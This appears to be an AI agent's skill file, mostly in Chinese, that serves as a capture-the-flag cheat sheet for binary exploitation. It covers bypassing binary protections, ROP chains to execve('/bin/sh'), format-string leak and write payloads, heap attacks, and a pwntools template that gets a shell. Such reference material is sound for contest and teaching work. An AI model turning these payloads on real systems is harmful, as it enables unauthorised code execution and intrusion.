---
name: pwn漏洞利用
description: Use when encountering 二进制漏洞利用技术 - 栈溢出、堆利用、rop、格式化字符串
---

# Pwn漏洞利用

## Info

- **Domain**: pwn
- **Tags**: pwn, binary, exploit, buffer-overflow, heap, rop

## 攻击思路
```
文件识别 → 保护机制分析 → 漏洞类型确定 → 利用链构造 → Shell获取
```

## 保护机制检测

| 保护 | 检测命令 | 绕过方法 |
|------|----------|----------|
| NX | readelf -l | ret2libc/ROP |
| PIE | checksec | 泄露地址 |
| Canary | checksec | 泄露Canary/格式化字符串 |
| RELRO | checksec | Partial可改GOT/Full需hook |
| ASLR | 系统默认 | 信息泄露 |

```bash
checksec --file=binary
readelf -l binary | grep GNU_STACK
```

## 栈溢出利用

### 基础栈溢出
```
缓冲区溢出 → 覆盖返回地址 → 跳转到shellcode/ROP链
```

### ROP链构造矩阵

| ROP类型 | 适用场景 | 关键技术 |
|----------|----------|----------|
| ret2text | NX disabled | 直接跳转代码段 |
| ret2shellcode | 可写段存在 | 注入shellcode |
| ret2syscall | 无libc | 控制寄存器执行syscall |
| ret2libc | NX enabled | 调用libc函数 |
| ret2csu | 无gadgets | 利用__libc_csu_init |
| SROP | sigreturn | 利用信号处理机制 |

### ret2syscall构造
```
pop eax; ret        → eax=0xb(execve)
pop ebx; ret        → ebx="/bin/sh"地址
pop ecx; ret        → ecx=0
pop edx; ret        → edx=0
int 0x80            → syscall
```

### ret2libc构造
```
pop rdi; ret        → rdi="/bin/sh"地址
ret                 → 对齐
system_addr         → 调用system
```

## 格式化字符串漏洞

| 操作 | Payload示例 |
|------|-------------|
| 泄露栈数据 | %p %p %p %p |
| 泄露指定偏移 | %7$p %10$p |
| 泄露Canary | %{canary_offset}$p |
| 泄露libc地址 | %{libc_offset}$p |
| 写入任意地址 | %{offset}$n |
| 写入指定值 | %{value}c%{offset}$n |

```python
# pwntools构造
payload = fmtstr_payload(offset, writes={addr: value})
```

## 堆利用技术

| 漏洞类型 | 原理 | 利用目标 |
|----------|------|----------|
| UAF | 释放后使用 | 控制释放后的chunk |
| Double Free | 两次释放 | tcache/fastbin attack |
| Heap Overflow | 堆溢出 | 覆盖相邻chunk |
| House of X | 特定堆攻击 | 控制malloc返回地址 |

### Fastbin Attack
```
1. 分配chunk A, chunk B
2. free chunk A → fastbin链
3. 悬空指针A写入目标地址
4. 分配chunk C → 从fastbin取
5. 再次分配 → 返回目标地址
```

### tcache Attack (glibc 2.26+)
```
1. 分配多个相同大小chunk
2. 释放填满tcache
3. Double free或UAF修改tcache链
4. malloc返回任意地址
```

## 利用链模板

```python
from pwn import *

# 信息泄露
io.sendafter(b'input:', b'%7$p')
leaked = int(io.recvline(), 16)
libc_base = leaked - libc_offset

# ROP链
rop = ROP(libc)
rop.system(libc_base + next(libc.search(b'/bin/sh')))
payload = b'A'*offset + rop.chain()

# 堆利用
io.sendlineafter(b'option:', b'1')  # alloc
io.sendlineafter(b'size:', str(size))
io.sendlineafter(b'data:', payload)
```

## 调试技巧

| 工具 | 用途 |
|------|------|
| pwndbg/GEF | GDB增强插件 |
| ROPgadget | gadget搜索 |
| one_gadget | execve("/bin/sh") gadget |
| libc-database | libc版本识别 |
| Angel/Sigreturn | SROP辅助 |